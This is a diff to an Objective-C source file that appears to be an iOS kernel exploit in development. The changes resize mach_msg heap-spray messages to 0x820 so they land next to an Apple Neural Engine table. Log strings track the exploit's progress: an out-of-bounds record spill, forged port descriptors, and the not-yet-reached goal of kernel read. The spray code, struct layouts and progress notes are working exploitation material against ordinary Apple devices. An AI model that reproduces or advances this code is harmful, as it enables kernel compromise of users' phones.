@@ -158,10 +158,17 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v72-guestB"
+#define P044_BUILD @"p044-v73-820spray"
 
 #define INPUT_COUNT 191
-#define PAYLOAD_SIZE 0xb80
+/* v73: P034 class. kdata = msgh_size + 0x24. ANE table view is 0x820.
+   msgh_size 0x7FC → kdata 0x820. Prior PAYLOAD 0xb80 made inline
+   msgh_size 0xb98 / kdata 0xbbc (same 3072 heuristic band, wrong table size).
+   iOS 26 kalloc_type may still sequester kmsg vs IOMallocType; this is the
+   named size match, not a type-stable proof. Do not remaining-fire 254. */
+#define P044_MSG_SIZE 0x7FCu
+#define P044_KDATA_SIZE (P044_MSG_SIZE + 0x24u)
+#define PAYLOAD_SIZE (P044_MSG_SIZE - 0x18u) /* inline body; hdr 0x18 → msgh 0x7FC */
 #define PAIR_COUNT 2048
 #define DRAIN_COUNT 2048
 #define COREML_MODEL_NAME @"XVRC27_191in_1out_addchain"
@@ -198,8 +205,8 @@ static BOOL p044_model_is_addchain(void) {
 /* v49 desc-tile recon: TAIL port-kind victims carry 8 port descriptors so
    descs 3..8 land INSIDE the ANE record tile (tile starts at body+0x1c =
    exactly after [body][desc1][desc2] in v48.1 dumps). Non-tail port-kind
-   victims keep 2 descs = v48.1 control. Message size UNCHANGED (0xb74,
-   kalloc.3072 band): 6 extra descs (72B) come out of the pad. */
+   victims keep 2 descs = v48.1 control. v73: whole msg is 0x7FC (kdata
+   0x820); extra descs come out of the pad. */
 #define P044_PORT_DESC_N 8
 #define CHURN_BATCH 512
 #define CHURN_SETTLE_SEC 1.0
@@ -245,7 +252,7 @@ static BOOL p044_model_is_addchain(void) {
 #define P044_RECLAIM_SURF 8u
 
 #define P044_CONTROL_RECV 0
-#define P044_EXPECT_INLINE (sizeof(mach_msg_header_t)+PAYLOAD_SIZE)
+#define P044_EXPECT_INLINE P044_MSG_SIZE
 #define P044_EXPECT_PORTK sizeof(port_msg_t)
 
 #ifndef ARM_NEON_STATE64
@@ -265,15 +272,19 @@ typedef struct {
     uint8_t bytes[];
 } inline_msg_t;
 
-/* complex msg: hdr 0x18 + body 0x4 + 8 port descs 0x60 + pad -> 0xb74
-   kdata = 0xb74 + 0x24 = 0xb98  (P034 band, kalloc.3072)
-   v49: desc[3..7] occupy body+0x1c..0x64 = the ANE record tile. */
+/* complex msg sized to P044_MSG_SIZE (0x7FC) so kdata = 0x820, same as
+   the CheckandPrewire IOMallocType table (P034 / pack 40). v49 desc-tile
+   (descs 3..8 in the record window) is kept; desc_type_forged from
+   {sid,0xcN,1,1} is not formable (note 118). */
 typedef struct {
     mach_msg_header_t hdr;
     mach_msg_body_t body;
     mach_msg_port_descriptor_t desc[P044_PORT_DESC_N];
-    uint8_t pad[PAYLOAD_SIZE - 0x40 - (P044_PORT_DESC_N - 2) * 12];
+    uint8_t pad[P044_MSG_SIZE - 0x18u - 0x4u - (P044_PORT_DESC_N * 12u)];
 } port_msg_t;
+_Static_assert(P044_KDATA_SIZE == 0x820u, "kdata must match ANE table view 0x820");
+_Static_assert(PAYLOAD_SIZE == 0x7E4u, "inline body = 0x7FC - 0x18");
+_Static_assert(sizeof(port_msg_t) == P044_MSG_SIZE, "port-kind msgh_size must be 0x7FC");
 
 typedef struct {
     int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-signal 4 inline-rejection 5 portkind-hit */
@@ -1745,8 +1756,8 @@ static void *watch_worker(void *arg) {
 
 /* v24 spray: proven mixed layout + last-8 port-kind tail. */
 + (pair_t *)sprayOut:(NSMutableString *)out drain:(mach_port_t **)outDrain {
-    [out appendFormat:@"\n=== PHASE 4: Spray mach_msg pairs=%u payload=0x%x (every %u victim = port-kind + last %u port-kind) ===\n",
-        PAIR_COUNT, PAYLOAD_SIZE, PORT_VICTIM_EVERY, TAIL_PORTK_COUNT];
+    [out appendFormat:@"\n=== PHASE 4: Spray mach_msg pairs=%u msgh=0x%x kdata=0x%x payload=0x%x (every %u victim = port-kind + last %u port-kind) ===\n",
+        PAIR_COUNT, P044_MSG_SIZE, P044_KDATA_SIZE, PAYLOAD_SIZE, PORT_VICTIM_EVERY, TAIL_PORTK_COUNT];
 
     mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
     pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
@@ -2224,9 +2235,8 @@ static void *watch_worker(void *arg) {
     [out appendString:@"v49 outcome (09:41): BAR HALF ONE PASSED - 62 forged sids {870..931, 0xc0..0xfd} received back from a LIVE port-kind victim at body+0x64..0x434 = exactly the tile end. Fill starts at victim body+0x64; desc-region forge (copyout reject) is the same landing 0x48 earlier. Field-window math (note 118 s3): type==0 never forms from {sid,0xcN,1,1}; desc conversion needs a different record pattern - the consume path is the door.\n"];
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
     [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
-    [out appendString:@"Landing lane per build: HOLE_MODE=0 live-kmsg neighbor (v70 1-record OOB). Hole punch CLOSED.\n"];
-    [out appendString:@"v71 Direct B: CoreML B is cached (note 120) and never re-prewires. B is a first Direct evaluate of XVRC27_127inmin_1out (127+1=128 records, MemoryMap CONSUMES). v71 one-process overlap FAILED: sharedConnection serializes (B t=1-3ms then A). v72: one-app second _ANEClient is probed; if none, in-process B is SKIPPED. Overlap is TWO INSTALLS: guest p044_guest.txt=directB loops Direct B 90s; standalone fires REQ_IN=192 1-record OOB during that window. Consume-forge = bar half two. Still not hasKread. AfterKread HOLD.\n"];
-    [out appendString:@"Occupancy HIT is a 3072 store of ANE records. NOT conversion. NOT hasKread.\n"];
+    [out appendString:@"Landing lane: HOLE_MODE=0 live 0x820 kmsg (v73). Hole punch CLOSED. Guest Direct-B overlap CLOSED (v72 err=0).\n"];
+    [out appendString:@"v73 0x820 spray: inline+port-kind msgh_size=0x7FC → kdata=0x820 (P034 class / pack 40). Was PAYLOAD 0xb80 → kdata 0xbbc. REQ_IN=192 (p044_req_in.txt) is 1-record OOB: spilled record is OUTPUT {outSid,0,1,2} at neighbor+0 (out_entry occupancy; 0xcN fingerprint needs N>=193). Do not remaining-fire 254. kalloc_type may still sequester kmsg vs ANE IOMallocType. Occupancy HIT is a 3072 store. NOT conversion. NOT hasKread. AfterKread HOLD.\n"];
     [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];
 
     pthread_mutex_lock(&g_evLock);
